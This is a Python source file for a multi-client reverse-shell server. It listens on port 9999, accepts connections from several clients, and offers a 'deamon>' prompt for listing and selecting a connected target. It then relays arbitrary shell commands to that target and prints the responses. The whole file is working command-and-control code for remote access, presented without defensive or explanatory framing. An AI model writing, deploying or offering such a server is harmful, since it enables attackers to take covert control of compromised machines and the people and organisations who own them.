import socket
import threading
import os
import time
from queue import Queue
import sys

NUMBER_OF_THREAD = 2
JOB_NUMBER = [x for x in range(1,NUMBER_OF_THREAD+1)]

queue = Queue()
all_connections = []
all_addresses = []

#create socket
def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))

#Binding socket to the port and wait for the client
def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to the port:" + str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n Retrying...")
		socket_bind()

#Accept connections from multiple clients and save them to list
def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while True:
		try:
			conn, address = s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print("\n Connection has been established: "+ address[0])
		except:
			print("Error in accepting connections")


#Intractive prompt for sending commands remotely
def start_prompt():
	while True:
		cmd = input('deamon> ')

		if cmd == 'list':
			list_connections()

		elif cmd == 'quit':
			os._exit(1)

		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)

		else:
			print("Command not recognized")

#Display all current connections
def list_connections():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i) + '   ' + str(all_addresses[i][0] +' '+str(all_addresses[i][1]) + '\n')
	print('-------- Clients --------' + '\n' + results)

#Select a target client
def get_target(cmd):
	try:
		target = int(cmd.replace('select ',''))
		conn = all_connections[target]
		print("You are now connected to " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '> ',end = "")
		return conn
	except:
		print("Not a valid selection")
		return None

#Send commands to the selected target
def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				if cmd == 'quit':
					break
				conn.send(str.encode(cmd))
				client_response = conn.recv(20480).decode()
				print(client_response,end="")

		except:
			print("Connection was lost")
			break

#Create worker threads
def create_workers():
	for _ in range(NUMBER_OF_THREAD):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

#bootup
def work():
	while True:
		x = queue.get()
		if x == 1:
			socket_create()
			socket_bind()
			accept_connections()
		if x == 2:
			start_prompt()
		queue.task_done()

#Each list item is a new job
def create_job():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

def main():
	create_workers()
	create_job()

if __name__ == '__main__':
	main()